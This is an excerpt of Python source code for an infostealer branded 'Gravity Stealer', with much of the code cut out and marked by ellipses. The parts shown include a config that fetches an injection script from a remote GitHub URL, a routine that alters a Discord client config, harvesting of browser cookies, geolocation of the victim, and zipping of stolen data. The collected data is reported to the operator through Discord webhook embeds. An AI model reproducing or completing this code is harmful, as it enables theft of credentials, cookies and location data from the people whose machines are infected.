...
__config__ = {
    ...
    'blackcap_inject_url': "https://raw.githubusercontent.com/MohxKd/Gravity-Stealer/main/index.js",
    'hide': '%_hide_script%',
    'ping': '%ping_enabled%',
    'pingtype': '%ping_type%',
...
class bl4ckc4p(Functions):
    ...
    def pingonrunning(self: str) -> str:
        ping1 = {
            'avatar_url': 'https://cdn.discordapp.com/attachments/1054536562119020615/1056253667373756427/99a2394a1899635e91b663e2f651c33d.gif',
            'content': "@everyone"
            }
        ping2 = {
            'avatar_url': 'https://cdn.discordapp.com/attachments/1054536562119020615/1056253667373756427/99a2394a1899635e91b663e2f651c33d.gif',
    ...
    async def byptknp(self):
        ...
        if ntpath.exists(config):
            ...
            with open(config, 'a') as f:
                f.write("\n\n//Gravity Stealer Create By MohxKd | https://discord.gg/t6FmbWeG8b")
...
GoogleMaps: {self.googlemap}
    ...
    def ending(self):
                ...
                with open(path, "r", errors="ignore") as ff:
                    ...
                    if not x:
                        ...
                        with open(path, "w", encoding="utf-8", errors="ignore") as f:
                            f.write("Gravity Stealer Create By MohxKd | https://discord.gg/t6FmbWeG8b\n\n")
                        with open(path, "a", encoding="utf-8", errors="ignore") as fp:
                            fp.write(x + "\n\nGravity Stealer Create By MohxKd | https://discord.gg/t6FmbWeG8b")

        _zipfile = ntpath.join(self.appdata, f'Gravity Stealer by MohxKd-[{infocom}].zip')
        ...
        embed = {
            'name': "Gravity Stealer By MohxKd",
            'avatar_url': 'https://cdn.discordapp.com/attachments/1054536562119020615/1056253667373756427/99a2394a1899635e91b663e2f651c33d.gif',
            'embeds': [
                {
                    'author': {
                        'name': f'Gravity Stealer v1.0',
                        'url': 'https://discord.gg/t6FmbWeG8b',
                        'icon_url': 'https://cdn.discordapp.com/attachments/1054536562119020615/1056253667373756427/99a2394a1899635e91b663e2f651c33d.gif'
                    },
                    'color': 374276,
                    'description': f'[Gravity - Stealer has Geo Localised this guy]({self.googlemap})',
                    'fields': [
                        {
                            'name': '\u200b',
                            'value': f'''```fix
                    ...
                    'footer': {
                        'text': 'Gravity Stealer Create By MohxKd https://discord.gg/t6FmbWeG8b'
                    }
                }
            ]
        }
...
def upload(name, tk=''):
    ...
    if name == "@Gravity Stealer":
        ...
        "embeds": [
            ...
            "author": {
                'name': f'Gravity Stealer',
                'url': 'https://discord.gg/t6FmbWeG8b',
                'icon_url': 'https://cdn.discordapp.com/attachments/1054536562119020615/1056253667373756427/99a2394a1899635e91b663e2f651c33d.gif'
            },
            "footer": {
                "text": "https://discord.gg/t6FmbWeG8b"
            },
            'color': 374276,
            }
        ],
    ...
    if "bc_allcookies" in name:
        ...
        "embeds": [
            ...
            "footer": {
                "text": "https://discord.gg/t6FmbWeG8b Gravity Stealer",
            },
            'color': 374276,
            }
        ],
...
def writeforfile(data, name):
    ...
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(f"Gravity Stealer Create By MohxKd https://discord.gg/t6FmbWeG8b\n\n")
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")
...
def getCookie(path, arg):
    ...
    tempfold = temp + "Gravity Stealer" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
